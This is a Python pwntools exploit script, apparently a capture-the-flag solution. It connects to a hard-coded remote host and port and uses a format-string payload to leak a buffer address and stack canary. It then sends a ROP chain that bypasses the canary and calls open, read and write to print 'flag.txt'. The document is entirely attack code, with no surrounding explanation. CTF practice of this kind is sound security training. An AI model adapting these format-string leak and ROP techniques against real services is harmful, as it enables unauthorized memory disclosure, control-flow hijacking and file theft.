from pwn import *

io = remote('139.177.185.41', 12335)

# Stage 1: Leak buffer address + canary
io.recvuntil(b'server: ')
io.sendline(b'%p %9$p')
res = io.recvline(keepends=False).split(b'0x')

buf = int(res[1].decode(), 16)
canary = int(res[2].decode(), 16)

log.info(f'Buffer: {hex(buf)}\nCanary: {hex(canary)}')


# Stage 2: ROP
io.recvuntil(b'server: ')
payload = b'flag.txt' #Start of our buffer
payload += p64(canary)
payload += p64(0)
payload += p64(0x10a4e)
payload += p64(0) # RSP will be here

payload += p64(1)
payload += p64(0) # Arg3
payload += p64(0) # Arg2
payload += p64(buf) # Arg1
payload += p64(0)
payload += p64(buf + 232) # Address contains address of Open
payload += p64(0x10a3c)
payload += p64(0) # RSP will be here

payload += p64(1)
payload += p64(100) # Arg3
payload += p64(buf) # Arg2
payload += p64(6) # Arg1 (fd geussing)
payload += p64(0)
payload += p64(buf + 240) # Address contains address of Read
payload += p64(0x10a3c)
payload += p64(0) # RSP will be here

payload += p64(1)
payload += p64(100) # Arg3
payload += p64(buf) # Arg2
payload += p64(1) # Arg1
payload += p64(0)
payload += p64(buf + 248) # Address contains address of Write
payload += p64(0x10a3c)
payload += p64(0) # RSP will be here

payload += p64(0x00026554) # Open function
payload += p64(0x00026616) # Read function
payload += p64(0x00026692) # Write function

io.sendline(payload)
io.interactive()